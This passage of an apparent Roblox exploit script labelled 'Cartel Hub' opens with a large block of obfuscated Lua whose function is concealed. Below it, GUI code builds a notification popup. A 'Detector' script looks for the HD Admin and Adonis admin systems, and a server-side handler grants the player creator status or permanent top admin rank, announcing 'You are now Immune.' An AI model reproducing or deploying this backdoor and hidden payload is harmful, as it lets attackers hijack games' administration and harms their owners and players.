k=F(v,u)X=R[k]k=true i[X]=k u=I(-30753+8952)Z=I(637556+-659385)v=c[u]a=F(Z,D)u=R[a]Z=20835521837601-(-364971)k=v[u]a=I(295977+-317786)u=F(a,Z)a=616243+12634031244995 v=R[u]X=k[v]u=I(384620+-406430)v=F(u,a)g=nil D=-1002175+11312216339430 Z=I(581261-603059)k=R[v]u=34379041759876-615795 i=X[k]v=I(564480-586354)k=F(v,u)X=R[k]k=true i[X]=k u=I(205502-227303)v=c[u]a=F(Z,D)u=R[a]a=I(980291-1002175)Z=-946493+11583881255777 k=v[u]u=F(a,Z)a=70562+27248104001406 v=R[u]X=k[v]u=I(-495791+473939)v=F(u,a)u=486511+26739134428375 k=R[v]v=I(-822840-(-800953))a=I(-514770-(-492847))i=X[k]k=F(v,u)Z=5697447674960-(-315498)X=R[k]k=true i[X]=k v=I(-264040+242239)k=c[v]u=F(a,Z)v=R[u]a=14597964703647-(-888188)u=I(-454190+432290)X=k[v]v=F(u,a)u=6167760915653-(-346539)k=R[v]i=X[k]v=I(-759800+737898)k=F(v,u)X=R[k]k=true i[X]=k end end else if x<815565-(-840442)then if x<-337834+1962927 then if x<232743+1305389 then O={}x=true r[V[-263528+263529]]=x x=c[I(802884-824698)]else Q=x l=137445-137444 N=z[l]l=false h=N==l n=h x=h and-558513+8631463 or-478575+15693120 end else R=r[V[-514669-(-514672)]]F=159014-159013 s=R~=F x=s and 9338045-(-802425)or 10486881-1024832 end else if x<72546+1674141 then B=I(737157-758968)O=I(455982+-477900)d=I(210688-232551)x=c[O]y=w(-429677+7888721,{})s=r[V[-714742+714746]]F=c[B]p=c[d]d={p(y)}p=480945-480943 G={o(d)}b=G[p]B=F(b)F=I(706870+-728738)R=s(B,F)s={R()}O=x(o(s))R=r[V[911745-911740]]x=R and 17450230-900860 or 5254913-706678 s=O O=R else x=O and 625459+1112322 or 140004+7840272 end end end else if x<251112+3222920 then if x<-962878+4322310 then if x<878843+1876101 then if x<902588+1096504 then x=736759+12217237 h=204774+-204773 Q=z[h]n=Q else O={R}x=c[I(-596931-(-575090))]end else x=true x=7450180-244584 end else if x<2771640-(-631732)then R=r[V[-834042+834043]]b=-1031294-(-1031296)B=-231655+231656 F=R(B,b)R=443694+-443693 s=F==R O=s x=s and 511984+1401930 or-542833+10071956 else x=806713+13717123 end end else if x<705782+3162967 then if x<3225682-(-487087)then if x<360235+3220481 then v=#k u=-72226+72226 A=v==u x=832826+10648613 else x=6644779-357739 H=i==X Y=H end else i=1005951+-1005886 y=q()r[y]=O g=41569+-41566 x=r[p]O=x(g,i)g=q()r[g]=O x=598323+-598323 i=x k=I(-696822+674959)O=c[k]x=870203-870203 A=E(16327827-998079,{})X=x k={O(A)}x={o(k)}k=x O=-1000767+1000769 x=k[O]A=x O=I(-114433-(-92515))x=c[O]v=r[F]S=I(652226-674037)H=c[S]S=H(A)H=I(-395928-(-374060))Y=v(S,H)v={Y()}O=x(o(v))v=q()r[v]=O Y=r[g]H=Y Y=729271+-729270 S=Y x=643956+8114071 Y=-103587+103587 u=S<Y O=851962+-851961 Y=O-S end else if x<-36577+4069509 then x=true x=x and 4350948-(-998591)or-56162+7261758 else D=m(D)a=m(a)x=642868+8115159 z=nil f=m(f)t=m(t)C=m(C)Z=m(Z)end end end end else if x<5796402-(-544561)then if x<602355+4751017 then if x<196902+4805029 then if x<3881360-(-966590)then if x<261992+4286690 then r[V[-150693+150698]]=O x=8349023-368747 s=nil else A=v Z=A k[A]=Z x=15567419-(-211367)A=nil end else s=r[V[-877691+877692]]O=#s s=323434-323434 x=O==s x=x and 6516007-590450 or 15091182-436270 end else if x<113060+4933385 then H=r[R]Y=H x=H and-497647+4087900 or 6361954-74914 else x=15046444-522608 end end else if x<6057063-10080 then if x<5690773-(-270184)then if x<6376324-454318 then x=r[V[369772-369771]]d=115108+-115108 y=-635637-(-635892)p=x(d,y)x=13899529-(-37025)R=F s[R]=p R=nil else F=-687669+687674 R=r[V[-214887+214889]]s=R*F R=872315+10574531319548 O=s+R s=35184371329480-(-759352)x=O%s R=-752950-(-752951)r[V[-744053-(-744055)]]=x s=r[V[283180-283177]]O=s~=R x=733943+8728106 end else x=-595506+14051277 end else if x<6857574-552945 then r[R]=Y x=r[R]x=x and-1040512+7005494 or 2518380-(-598771)else O={}x=c[I(758520+-780432)]end end end else if x<7734703-524592 then if x<6885895-5920 then if x<-870715+7473620 then if x<6219049-(-307882)then g=I(423353-445230)y=c[g]x=912892+2871927 O=y else d=g x=649907-136868 S=I(-179110+157214)H=c[S]S=I(-1063167-(-1041344))Y=H[S]H=Y(s,d)Y=r[V[-721008-(-721014)]]S=Y()v=H+S S=161893+-161892 d=nil A=v+G v=620979-620723 k=A%v v=F[R]G=k H=G+S Y=B[H]A=v..Y F[R]=A end else g=I(-899772+877942)x=13474171-143332 i=5212102720752-846330 v=149605+27583121595379 y=F(g,i)p=R[y]X=363819+18700857947869 i=I(-195316-(-173413))g=F(i,X)i=I(-822434-(-800633))y=R[g]B[p]=y y=I(-128676+106839)p=c[y]g=259688+-259685 y=p(g)g=c[i]k=I(-174885+153027)X=F(k,v)i=R[X]k=13883905081557-(-405933)y=g[i]X=I(613389-635188)i=F(X,k)g=R[i]p=y[g]y=I(-600755+578965)y=p[y]y=y(p)end else if x<7685033-491247 then i=I(1011327+-1033135)X=16466446-888380 i=d[i]i=i(d,X)x=14156497-996159 X=779320+-779065 g=i==X p=g else x=e(-818745+8948017,{B})H={x()}O={o(H)}x=c[I(856379+-878207)]end end else if x<8563105-918716 then if x<-70434+7527271 then if x<7497170-279913 then v=#k u=697910+-697910 A=v==u x=A and 9689287-(-971390)or 106147+11375292 else x=-154085+11128116 v=564466-564465 A=p+v p=A end else O=677749+4140319 F=13960587-(-430637)R=I(-948020-(-926141))s=R^F x=O-s O=I(-1039872+1018047)s=x x=O/s O={x}x=c[I(-748407+726604)]end else if x<8337845-564786 then x=c[I(-433581+411788)]O={}else x=r[V[-571122+571132]]R=r[V[907068+-907057]]s[x]=R x=r[V[537661-537649]]R={x(s)}O={o(R)}x=c[I(466606+-488433)]end end end end end else if x<992255+11259216 then if x<10568999-603187 then if x<-756343+10121097 then if x<8465434-(-130276)then if x<-857083+8958276 then if x<7938861-(-67042)then x=r[V[850746+-850739]]x=x and 12154066-(-728759)or 81251+12184596 else l=1021248+-1021246 N=z[l]l=r[t]x=14776419-(-438126)h=N==l n=h end else x=366891+12832872 end else if x<8798379-(-500528)then if x<8967935-(-113700)then a=not u Y=Y+S O=Y<=H O=a and O a=Y>=H a=u and a O=a or O a=-842042+1338697 x=O and a O=4292131-(-748151)x=x or O else n=r[R]O=n x=n and 1480397-(-93539)or 12272791-(-484079)end else k=I(463854+-485675)X=c[k]x=13089840-891580 k=I(1020736+-1042613)i=X[k]y=i end end else if x<1041600+8746632 then if x<10467523-844986 then if x<188582+9335930 then R=r[V[-526384+526387]]F=-446450-(-446638)s=R*F x=556401+1070272 R=754423+-754166 O=s%R r[V[-538545+538548]]=O else R=r[V[-435758+435760]]F=r[V[-767288+767291]]x=932797+981117 s=R==F O=s end else u=I(-737933-(-716086))x=c[u]u=I(-952669-(-930877))c[u]=x x=3855446-410605 end else if x<-691765+10560638 then y=I(-573182-(-551345))p=c[y]i=-848378+7264085970023 A=-1017664+5245389904469 X=5078953404365-(-420525)g=.3 y=p(g)g=I(-49768-(-27937))y=F(g,i)p=R[y]i=I(211156-233063)g=F(i,X)y=R[g]k=I(-200175-(-178342))i=I(213927+-235728)B[p]=y g=c[i]X=F(k,A)i=R[X]y=g[i]k=34690435909399-133348 X=I(-873231-(-851322))i=F(X,k)X=-466606+17723723898664 g=R[i]i=I(850497-872315)p=y[g]g=F(i,X)y=R[g]D=I(-554872-(-532977))g=false p[y]=g g=I(831482+-853319)i=636664-636660 p=536497+-536497 a=I(-327722+305921)y=c[g]g=y(i)f=21839501489364-42337 g=I(336298+-358087)y=c[g]u=c[a]Z=F(D,f)a=R[Z]x=13992779-111523 D=17330721102738-(-828282)Z=I(277993+-299898)v=u[a]a=F(Z,D)u=R[a]a=I(-368105-(-346219))A=v[u]Z=224807+245894156990 u=F(a,Z)v=R[u]k=A[v]v=I(-475631+453796)v=k[v]A={v(k)}k={y(o(A))}i=k[336746+-336744]g=k[691381+-691380]X=k[459313-459310]else d=I(-937405+915509)x={}r[V[402668+-402666]]=x O=r[V[721654+-721651]]b=311338+35184371777494 x=22496-(-490543)B=O p=-337066+337321 O=R%b r[V[994367+-994363]]=O G=R%p p=-421291-(-421293)g=-48160-(-48161)b=G+p r[V[466542+-466537]]=b p=c[d]d=I(943489-965374)G=p[d]p=G(s)G=I(-989917-(-967998))F[R]=G G=-269672+269815 d=-571121-(-571122)i=g y=p g=33569-33569 X=i<g g=d-i end end end else if x<9989563-(-925693)then if x<-698422+10973324 then if x<9517307-(-634804)then if x<10695185-559921 then O=I(-661108+639255)s=I(-336682+314769)x=c[O]O=x(s)x=c[I(-634711-(-612915))]O={}else R=r[V[699702+-699699]]F=-971550-(-971582)s=R%F y=-117538-(-117540)B=r[V[-856379+856383]]p=r[V[182182+-182180]]i=945098-945085 A=r[V[-391657-(-391660)]]k=A-s A=-292937-(-292969)X=k/A x=13835399-(-819513)g=i-X d=y^g G=p/d b=B(G)B=4295106276-138980 F=b%B b=-179428-(-179430)B=b^s R=F/B B=r[V[-665141+665145]]d=822714-822713 p=R%d d=4294939999-(-27297)G=p*d b=B(G)B=r[V[303917-303913]]G=B(R)R=nil F=b+G b=229605-164069 B=F%b p=-350637-(-416173)G=F-B b=G/p p=876795+-876539 G=B%p i=-316266-(-316522)y=999167+-998911 d=B-G p=d/y F=nil y=-334698-(-334954)s=nil B=nil d=b%y g=b-d y=g/i g={G,p,d,y}p=nil G=nil y=nil b=nil d=nil r[V[397613-397612]]=g end else b=q()R=q()s=T p=I(685007-706870)x=true F=I(617516-639412)B=q()r[R]=x d=w(830520-(-538097),{b})O=c[F]F=I(148261+-170134)x=O[F]F=q()r[F]=x x=P(-657332+10749160,{})r[B]=x x=false r[b]=x G=c[p]p=G(d)x=p and-63459-(-509936)or 907516+12664995 O=p end else if x<-459566+11147078 then v=q()A={}r[v]=A Z={}u=w(5183358-229095,{v;y,g;b})z=I(833274+-855106)f=I(742724-764536)h=nil A=q()r[A]=u k=nil i=nil b=m(b)a=q()d=nil u={}C=I(-850568-(-828730))r[a]=u G=nil u=c[C]t=r[a]D={[f]=t,[z]=h}i=1869440858967-(-707446)C=u(Z,D)B=nil R=C d=I(-518104-(-496303))p=nil u=K(-416365+11262904,{a;v;X,y;g;A})p=c[d]y=m(y)g=m(g)A=m(A)F=u g=I(14149-36065)a=m(a)y=F(g,i)X=m(X)v=m(v)d=R[y]g=-861243+20185889435050 X=26670412532621-(-808313)y=I(59885-81763)G=p[d]d=F(y,g)v=I(467630+-489431)p=R[d]i=I(112234-134116)d=I(-19745+-2075)y=-799993+2409550986685 b=G[p]p=F(d,y)G=R[p]B=b[G]y=I(43361+-65162)d=c[y]g=F(i,X)y=R[g]Z=-776056+11998358078238 i=-564337+22451553529374 p=d[y]g=I(99883-121700)y=F(g,i)g=-223015+8491409704459 d=R[y]G=p[d]y=I(202321-224231)d=F(y,g)p=R[d]b=G[p]X=32825288499505-(-808505)y=I(275369+-297170)i=I(-574801-(-552945))d=c[y]g=F(i,X)i=523952+5568594515346 y=R[g]g=I(-473647+451843)p=d[y]y=F(g,i)d=R[y]G=p[d]g=477359+23552171445503 y=I(232698-254504)d=F(y,g)p=R[d]y=I(-122340+100423)g=28583878707454-(-958206)d=true b[p]=d d=F(y,g)y=I(-372140+350243)p=R[d]d=true G[p]=d g=-1019008+4962987187854 i=30155886089761-419949 d=F(y,g)g=780634944848-815737 y=I(-879125-(-857211))p=R[d]X=714678+9570552232731 d=true B[p]=d d=F(y,g)p=R[d]g=I(-459374+437499)y=F(g,i)d=R[y]B[p]=d d=I(171609-193446)y=410606-410605 i=662517+15880051793360 p=c[d]d=p(y)g=6286949521449-(-720566)y=I(-366891+345055)d=F(y,g)g=I(559924-581746)p=R[d]y=F(g,i)d=R[y]y=I(-155129-(-133284))B[p]=d i=I(301413-323306)d=c[y]g=F(i,X)a=I(600627+-622489)y=R[g]p=d[y]A=c[v]u=F(a,Z)v=R[u]k=A[v]a=24646347572917-(-660212)u=I(-970826-(-948925))v=F(u,a)A=R[v]u=33205405585198-71266 v=I(-964497-(-942589))X=k[A]A=F(v,u)v=24135232517388-990527 k=R[A]i=X[k]A=I(-258270-(-236455))k=F(A,v)X=R[k]k=I(577737-599667)d=I(-474030-(-452142))g=i[X]A=8178940426829-(-648052)X=F(k,A)i=R[X]d=p[d]X=-1015359+16593425 y=g[i]i=I(-146277+124469)d=d(p,y)y=x i=d[i]i=i(d,X)X=1028224+-1028219 g=i==X p=g x=g and-1011583+14171921 or 75554+7115193 else x=r[V[-838009-(-838010)]]R=T[902460+-902458]s=T[-546480-(-546481)]F=x x=F[R]x=x and 12111185-(-1026112)or 10336283-400108 end end else if x<11540845-(-232935)then if x<279209+11018590 then if x<10967720-(-33569)then y=nil k=nil x=14615071-733815 else Q=r[R]n=Q x=Q and 900028+1058431 or 12467613-(-486383)end else v=-1023295-(-1023296)u=#k Z=211112-211111 x=6794927-(-420397)A=B(v,u)v=G(k,A)A=nil u=r[X]C=v-Z a=p(C)u[v]=a v=nil end else if x<11684428-(-494703)then S=I(-817401+795590)x=c[S]a=I(773560+-795352)u=c[a]S=x(u)x=I(309674+-331521)c[x]=S x=2471403-(-973438)else O=y x=g x=y and 2782260-(-1002559)or-627123+6980725 end end end end else if x<412141+13056276 then if x<114148+13033028 then if x<454062+12474467 then if x<-98915+12862250 then if x<11509016-(-964542)then R=331946+-331945 x={}s=x F=r[V[-1003446-(-1003455)]]B=F F=482736-482735 b=F F=-599411+599411 x=930813+13005741 G=b<F F=R-b else r[R]=O x=4954359-621683 end else F=-288681-(-288681)s=I(417453+-439306)x=c[s]R=r[V[-487407+487415]]s=x(R,F)x=12377242-111395 end else if x<-649012+13743722 then r[R]=n J=20641+-20640 l=r[D]N=l+J h=z[N]Q=i+h h=-228711-(-228967)x=Q%h i=x x=-146277+4478953 N=r[Z]h=X+N N=947389+-947133 Q=h%N X=Q else x=65378+2563822 end end else if x<624819+12585800 then if x<895932+12295010 then if x<-965758+14130594 then x=y x=p and-519728+10351452 or-586930+7263614 else y=X a=I(-432496-(-410605))A=I(-161125+139264)Z=6284801765920-(-926909)u=F(a,Z)v=R[u]A=k[A]A=A(k,v)x=A and 8047126-829242 or 10039762-(-934269)end else x=true x=x and-1035648+1057664 or 491887+5836626 end else if x<12539788-(-847994)then R=nil G=nil O={}B=nil x=c[I(-325435-(-303529))]d=nil b=nil F=nil else d=nil F=m(F)g=m(g)v=m(v)R=m(R)p=m(p)d=I(-639472-(-617651))p=I(-353738-(-331818))R=nil y=m(y)k=nil b=m(b)i=nil G=nil X=nil B=m(B)A=nil F=nil G=I(928861-950781)A=845306+-845305 b=c[G]G=I(-1002012-(-980158))B=b[G]y=I(-811321+789425)g=q()b=q()X=q()r[b]=B G=c[p]p=I(-801657+779855)B=G[p]v=-963454-(-963710)i={}p=c[d]d=I(-87843+65962)G=p[d]d=c[y]y=I(53735-75554)p=d[y]d=-477039-(-477039)y=q()r[y]=d d=167909+-167907 u=v r[g]=d d={}v=-334826+334827 k={}r[X]=i i=-481455-(-481455)x=14827045-(-951741)a=v v=-562993+562993 C=a<v v=A-a end end end else if x<15047556-419437 then if x<13011194-(-919356)then if x<-322794+14201139 then if x<-966590+14524115 then p=nil x=255080+2374120 B=nil G=nil else p=I(-434381-(-412461))d=I(287853-309674)G=O O=c[p]p=I(469765-491567)x=O[p]p=q()r[p]=x O=c[d]d=I(132964+-154808)x=O[d]d=x X=I(-216099-(-194278))g=x i=c[X]y=i x=i and-482607+9825356 or 12013902-(-184358)end else X,k=g(i,X)x=X and-301801+13486716 or 286249+809976 end else if x<-695286+14896903 then F=F+b R=F<=B p=not G R=p and R p=F>=B p=G and p R=p or R p=-139044+6059481 x=R and p R=8153753-362923 x=x or R else x=true x=x and 117220+690228 or 7303487-(-466350)end end else if x<16704666-977982 then if x<14699919-(-520304)then if x<15651220-546545 then F=I(906428+-928249)R=c[F]x=c[I(-939659-(-917820))]F=I(314026+-335907)s=R[F]F=r[V[-976701-(-976702)]]R={s(F)}O={o(R)}else x=Q x=12549152-(-207718)O=n end else R=I(391148+-413003)O=654964+14369623 F=6101339-200870 s=R^F x=O-s O=I(-939569-(-917756))s=x x=O/s O={x}x=c[I(179727-201638)]end else if x<15516737-(-546417)then v=v+a Z=not C A=v<=u A=Z and A Z=v>=u Z=C and Z A=Z or A Z=188902+4367013 x=A and Z A=-514608+4039835 x=x or A else F=r[V[-38241+38247]]x=-991999+5540234 R=F==s O=R end end end end end end end x=#U return o(O)end return(b(10133974-(-42849),{}))(o(O))end)(getfenv and getfenv()or _ENV,unpack or table[I(-378208-(-356331))],newproxy,setmetatable,getmetatable,select,{...})end)(...)
end))
ModuleScript145.Name = "Notif"
ModuleScript145.Parent = Frame1
table.insert(cors,sandbox(ModuleScript145,function()
local screenGui = script.Parent.Parent

local NotificationObject = {}
NotificationObject.__index = NotificationObject


function NotificationObject.new()
    local newNotifObj = setmetatable({}, NotificationObject)
    return newNotifObj
end


function NotificationObject:PushNotification(msg)

    for _,oldNotif in pairs(screenGui:FindFirstChild("Notifications"):GetChildren()) do
        oldNotif:TweenPosition(oldNotif.Position - UDim2.new(0,0,0, oldNotif.Size.Y.Offset + 10),Enum.EasingDirection.Out,Enum.EasingStyle.Quint,1)
    end
    local Notification = script.Notification:Clone()
    Notification.Parent = script.Parent.Parent.Notifications
    Notification.Message.Text = msg
    Notification:TweenPosition(UDim2.new(1, -10,1, -10),Enum.EasingDirection.Out,Enum.EasingStyle.Quint,1)
    wait(10)
    Notification:TweenPosition(Notification.Position - UDim2.new(-0.5025125628140704,-10,0,0),Enum.EasingDirection.In,Enum.EasingStyle.Quint,1)
    wait(1)
    Notification:Destroy()
end

return NotificationObject
end))
Frame146.Name = "Notification"
Frame146.Parent = ModuleScript145
Frame146.Position = UDim2.new(1.99000001, -10, 0.999000013, -10)
Frame146.Size = UDim2.new(0, 238, 0, 109)
Frame146.AnchorPoint = Vector2.new(1, 1)
Frame146.BackgroundColor = BrickColor.new("Institutional white")
Frame146.BackgroundColor3 = Color3.new(1, 1, 1)
Frame146.BorderColor = BrickColor.new("Really black")
Frame146.BorderColor3 = Color3.new(0, 0, 0)
Frame146.BorderSizePixel = 0
Frame146.ZIndex = 10
TextLabel147.Name = "Title"
TextLabel147.Parent = Frame146
TextLabel147.Position = UDim2.new(0.268907577, 0, 0.0366972461, 0)
TextLabel147.Size = UDim2.new(0, 77, 0, 23)
TextLabel147.BackgroundColor = BrickColor.new("Institutional white")
TextLabel147.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel147.BackgroundTransparency = 1
TextLabel147.BorderColor = BrickColor.new("Really black")
TextLabel147.BorderColor3 = Color3.new(0, 0, 0)
TextLabel147.BorderSizePixel = 0
TextLabel147.ZIndex = 12
TextLabel147.Font = Enum.Font.Unknown
TextLabel147.FontSize = Enum.FontSize.Size24
TextLabel147.Text = "Cartel Hub"
TextLabel147.TextColor = BrickColor.new("Institutional white")
TextLabel147.TextColor3 = Color3.new(1, 1, 1)
TextLabel147.TextSize = 23
TextLabel147.TextXAlignment = Enum.TextXAlignment.Left
TextLabel148.Name = "Message"
TextLabel148.Parent = Frame146
TextLabel148.Position = UDim2.new(0.0336134471, 0, 0.247706428, 0)
TextLabel148.Size = UDim2.new(0, 224, 0, 71)
TextLabel148.BackgroundColor = BrickColor.new("Institutional white")
TextLabel148.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel148.BackgroundTransparency = 1
TextLabel148.BorderColor = BrickColor.new("Really black")
TextLabel148.BorderColor3 = Color3.new(0, 0, 0)
TextLabel148.BorderSizePixel = 0
TextLabel148.ZIndex = 12
TextLabel148.Font = Enum.Font.Gotham
TextLabel148.FontSize = Enum.FontSize.Size14
TextLabel148.Text = ""
TextLabel148.TextColor = BrickColor.new("Institutional white")
TextLabel148.TextColor3 = Color3.new(1, 1, 1)
TextLabel148.TextSize = 14
TextLabel148.TextWrap = true
TextLabel148.TextWrapped = true
Frame149.Name = "Overlay"
Frame149.Parent = Frame146
Frame149.Size = UDim2.new(0, 238, 0, 109)
Frame149.BackgroundColor = BrickColor.new("Black")
Frame149.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame149.BackgroundTransparency = 0.550000011920929
Frame149.BorderColor = BrickColor.new("Really black")
Frame149.BorderColor3 = Color3.new(0, 0, 0)
Frame149.BorderSizePixel = 0
Frame149.ZIndex = 11
Frame150.Name = "Overlay"
Frame150.Parent = Frame1
Frame150.Size = UDim2.new(0, 259, 0, 149)
Frame150.BackgroundColor = BrickColor.new("Black")
Frame150.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame150.BackgroundTransparency = 0.550000011920929
Frame150.BorderColor = BrickColor.new("Really black")
Frame150.BorderColor3 = Color3.new(0, 0, 0)
Frame150.BorderSizePixel = 0
LocalScript151.Name = "ClientMain"
LocalScript151.Parent = Frame1
table.insert(cors,sandbox(LocalScript151,function()
local Notification = require(script.Parent.Notif)
Notification.new()
wait(7)
Notification:PushNotification("Welcome back, ".. game.Players.LocalPlayer.Name)

end))
LocalScript152.Name = "Detector"
LocalScript152.Parent = Frame1
table.insert(cors,sandbox(LocalScript152,function()
wait(3)
local REAL = script.REAL
local Notification = require(script.Parent.Notif)
local ADMINS = {
    ["Admins"] = {
        ["HD Admin"] = false,
        ["ADONIS"] = false
    }
}
local function all_admins_detected()
    for _, is_detected in pairs(ADMINS["Admins"]) do
        if is_detected == false then
            return false
        else
            return true
        end
    end
end
while all_admins_detected() == false do
    for i, v in pairs(game:GetDescendants()) do
        if v.Name == "HDAdminSetup" and v:IsA("ModuleScript") then
            local admin_name = "HD Admin"
            for _, admin in pairs(ADMINS["Admins"]) do
                ADMINS["Admins"][admin_name] = true
                Notification:PushNotification(admin_name .. " has been detected. You are now Immune.")
                REAL:FireServer(admin_name)
            end
        end
        if string.find(v.Name,"__ADONIS_LOCALCONTAINER") and v:IsA("Folder") then
            local admin_name = "ADONIS"
            for _, admin in pairs(ADMINS["Admins"]) do
                ADMINS["Admins"][admin_name] = true
                Notification:PushNotification(admin_name .. " has been detected. You are now Immune.")
                REAL:FireServer(admin_name)
            end
        end
    end
    wait(1)
end

end))
Script153.Parent = LocalScript152
table.insert(cors,sandbox(Script153,function()
script.Parent.REAL.OnServerEvent:Connect(function(plr, ADMIN)
    if ADMIN == "ADONIS" then
        wait(5)
        local data = {};
        data.Settings = {};
        data.Settings.Creators = {plr.Name};
        require(7510592873)(data);
        data = nil;
    elseif ADMIN == "HD Admin" then
        wait(5)
        _G.HDAdminMain:GetModule("cf"):SetRank(plr, game.CreatorId, 999999999999999, "Perm")
    end
end)
end))
RemoteEvent154.Name = "REAL"
RemoteEvent154.Parent = LocalScript152
Folder155.Name = "Notifications"
Folder155.Parent = ScreenGui0
for i,v in pairs(mas:GetChildren()) do
	v.Parent = workspace
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end

																									
